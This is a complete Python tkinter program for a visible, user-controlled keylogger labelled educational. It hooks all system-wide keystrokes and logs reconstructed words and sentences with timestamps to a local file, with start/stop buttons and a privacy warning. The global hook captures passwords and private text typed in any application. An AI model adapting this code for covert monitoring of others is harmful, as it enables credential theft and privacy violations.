import keyboard
import time
from datetime import datetime
import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import os
import json
from collections import defaultdict

class WordKeyloggerApp:
    def __init__(self, root):
        self.root = root
        self.root.title("Word-Based Keylogger (Educational Only)")
        self.root.geometry("800x650")
        
        self.logging = False
        self.log_file = ""
        self.max_size_kb = 100
        self.session_count = 0
        self.key_counts = defaultdict(int)
        self.current_word = ""
        self.current_sentence = ""
        self.last_key_time = time.time()
        
        self.create_widgets()
        
    def create_widgets(self):
        # File Selection Frame
        file_frame = tk.LabelFrame(self.root, text="Log File Settings", padx=10, pady=10)
        file_frame.pack(pady=10, padx=10, fill="x")
        
        tk.Label(file_frame, text="Log File Path:").grid(row=0, column=0, sticky="w")
        
        self.file_entry = tk.Entry(file_frame, width=50)
        self.file_entry.grid(row=1, column=0, padx=5)
        
        browse_btn = tk.Button(file_frame, text="Browse...", command=self.select_file)
        browse_btn.grid(row=1, column=1, padx=5)
        
        # Settings Frame
        settings_frame = tk.LabelFrame(self.root, text="Logging Settings", padx=10, pady=10)
        settings_frame.pack(pady=10, padx=10, fill="x")
        
        tk.Label(settings_frame, text="Max Log Size (KB):").grid(row=0, column=0, sticky="w")
        self.size_entry = tk.Entry(settings_frame, width=10)
        self.size_entry.insert(0, "100")
        self.size_entry.grid(row=0, column=1, sticky="w", padx=5)
        
        tk.Label(settings_frame, text="Word timeout (seconds):").grid(row=1, column=0, sticky="w")
        self.word_timeout_entry = tk.Entry(settings_frame, width=10)
        self.word_timeout_entry.insert(0, "1.5")
        self.word_timeout_entry.grid(row=1, column=1, sticky="w", padx=5)
        
        tk.Label(settings_frame, text="Sentence timeout (seconds):").grid(row=2, column=0, sticky="w")
        self.sentence_timeout_entry = tk.Entry(settings_frame, width=10)
        self.sentence_timeout_entry.insert(0, "3.0")
        self.sentence_timeout_entry.grid(row=2, column=1, sticky="w", padx=5)
        
        # Control Buttons
        btn_frame = tk.Frame(self.root)
        btn_frame.pack(pady=10)
        
        self.start_btn = tk.Button(btn_frame, text="Start Logging", command=self.start_logging, bg="green", fg="white", width=15)
        self.start_btn.pack(side=tk.LEFT, padx=5)
        
        self.stop_btn = tk.Button(btn_frame, text="Stop Logging", command=self.stop_logging, state=tk.DISABLED, bg="red", fg="white", width=15)
        self.stop_btn.pack(side=tk.LEFT, padx=5)
        
        self.clear_btn = tk.Button(btn_frame, text="Clear Preview", command=self.clear_preview)
        self.clear_btn.pack(side=tk.LEFT, padx=5)
        
        # Preview Area
        preview_frame = tk.LabelFrame(self.root, text="Live Typing Preview", padx=10, pady=10)
        preview_frame.pack(pady=10, padx=10, fill="both", expand=True)
        
        self.preview_text = scrolledtext.ScrolledText(preview_frame, width=90, height=20, wrap=tk.WORD, font=('Consolas', 10))
        self.preview_text.pack(fill="both", expand=True)
        
        # Status Bar
        self.status_var = tk.StringVar()
        self.status_var.set("Status: Ready")
        tk.Label(self.root, textvariable=self.status_var, bd=1, relief=tk.SUNKEN, anchor=tk.W).pack(side=tk.BOTTOM, fill="x")
        
        # Disclaimer
        disclaimer = tk.Label(self.root, 
                            text="⚠️ WARNING: For educational purposes only! Unauthorized use may violate privacy laws.",
                            fg="red", wraplength=750)
        disclaimer.pack(side=tk.BOTTOM, pady=5)
    
    def select_file(self):
        initial_file = "typing_log_"+datetime.now().strftime("%Y%m%d")+".txt"
        file_path = filedialog.asksaveasfilename(
            initialfile=initial_file,
            defaultextension=".txt",
            filetypes=[("Text files", "*.txt"), ("JSON files", "*.json"), ("All files", "*.*")]
        )
        if file_path:
            self.file_entry.delete(0, tk.END)
            self.file_entry.insert(0, file_path)
    
    def start_logging(self):
        self.log_file = self.file_entry.get()
        if not self.log_file:
            messagebox.showerror("Error", "Please select a log file location")
            return
            
        try:
            self.max_size_kb = int(self.size_entry.get())
            if self.max_size_kb <= 0:
                raise ValueError
            
            self.word_timeout = float(self.word_timeout_entry.get())
            self.sentence_timeout = float(self.sentence_timeout_entry.get())
        except ValueError:
            messagebox.showerror("Error", "Please enter valid numbers for all settings")
            return
        
        # Reset for new session
        self.session_count += 1
        self.key_counts = defaultdict(int)
        self.current_word = ""
        self.current_sentence = ""
        self.last_key_time = time.time()
        
        # Create log header
        header = [
            "="*100,
            f"TYPING LOG SESSION #{self.session_count}",
            f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            f"Log File: {self.log_file}",
            f"Settings: MaxSize={self.max_size_kb}KB | WordTimeout={self.word_timeout}s | SentenceTimeout={self.sentence_timeout}s",
            "="*100,
            ""
        ]
        
        with open(self.log_file, 'a') as f:
            f.write("\n".join(header) + "\n")
        
        self.update_preview("\n".join(header[1:-1]) + "\n")
        
        self.logging = True
        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.status_var.set(f"Status: Logging session #{self.session_count} (Press ESC to stop)")
        
        keyboard.on_press(self.on_key_press)
        self.root.after(100, self.check_typing_pause)
        self.root.after(1000, self.check_file_size)
    
    def stop_logging(self):
        if not self.logging:
            return
            
        self.logging = False
        keyboard.unhook_all()
        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        
        # Flush any remaining text
        self.finalize_word()
        self.finalize_sentence()
        
        # Create log footer with statistics
        total_keys = sum(self.key_counts.values())
        footer = [
            "",
            "="*100,
            f"SESSION STATISTICS (Session #{self.session_count})",
            f"Total keys pressed: {total_keys}",
            f"Most pressed keys: {sorted(self.key_counts.items(), key=lambda x: x[1], reverse=True)[:5]}",
            f"Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
            "="*100,
            ""
        ]
        
        with open(self.log_file, 'a') as f:
            f.write("\n".join(footer) + "\n")
        
        self.update_preview("\n".join(footer[1:-1]))
        self.status_var.set(f"Status: Stopped. Session #{self.session_count} saved to {self.log_file}")
    
    def on_key_press(self, event):
        if not self.logging:
            return
            
        current_time = time.time()
        time_since_last = current_time - self.last_key_time
        self.last_key_time = current_time
        
        key_name = event.name
        self.key_counts[key_name] += 1
        
        # Handle special keys
        if len(key_name) > 1:  # It's a special key
            if key_name == 'space':
                self.finalize_word()
                self.current_sentence += " "
                self.update_preview(" ", scroll_to_end=True)
            elif key_name == 'enter':
                self.finalize_word()
                self.finalize_sentence()
                self.update_preview("\n", scroll_to_end=True)
            elif key_name == 'backspace':
                if self.current_word:
                    self.current_word = self.current_word[:-1]
            elif key_name in ['shift', 'ctrl', 'alt', 'caps lock', 'tab']:
                pass  # Ignore modifier keys
            else:
                self.finalize_word()
                self.finalize_sentence()
                special_key_text = f"[{key_name.upper()}]"
                self.current_sentence += special_key_text
                self.update_preview(special_key_text, scroll_to_end=True)
        else:  # Regular character
            # Check if we should start a new word
            if time_since_last > self.word_timeout:
                self.finalize_word()
            
            self.current_word += key_name
            self.update_preview(key_name, scroll_to_end=True)
    
    def finalize_word(self):
        if self.current_word:
            # Add word to current sentence
            self.current_sentence += self.current_word
            self.current_word = ""
            
            # Check if we should finalize the sentence
            if time.time() - self.last_key_time > self.sentence_timeout:
                self.finalize_sentence()
    
    def finalize_sentence(self):
        if self.current_sentence.strip():
            timestamp = datetime.now().strftime('%H:%M:%S')
            log_entry = f"{timestamp} | {self.current_sentence}\n"
            
            with open(self.log_file, 'a') as f:
                f.write(log_entry)
            
            self.current_sentence = ""
    
    def check_typing_pause(self):
        if not self.logging:
            return
            
        current_time = time.time()
        time_since_last = current_time - self.last_key_time
        
        # Check if we should finalize the current word
        if self.current_word and time_since_last > self.word_timeout:
            self.finalize_word()
        
        # Check if we should finalize the current sentence
        if self.current_sentence and time_since_last > self.sentence_timeout:
            self.finalize_sentence()
        
        self.root.after(100, self.check_typing_pause)
    
    def check_file_size(self):
        if not self.logging:
            return
            
        file_size = os.path.getsize(self.log_file) / 1024
        
        if file_size >= self.max_size_kb:
            messagebox.showwarning("Log Full", f"Log file has reached maximum size ({self.max_size_kb}KB)")
            self.stop_logging()
        else:
            self.root.after(1000, self.check_file_size)
    
    def update_preview(self, text, scroll_to_end=False):
        self.preview_text.config(state=tk.NORMAL)
        self.preview_text.insert(tk.END, text)
        if scroll_to_end:
            self.preview_text.see(tk.END)
        self.preview_text.config(state=tk.DISABLED)
    
    def clear_preview(self):
        self.preview_text.config(state=tk.NORMAL)
        self.preview_text.delete(1.0, tk.END)
        self.preview_text.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    app = WordKeyloggerApp(root)
    
    keyboard.add_hotkey('esc', app.stop_logging)
    
    root.mainloop()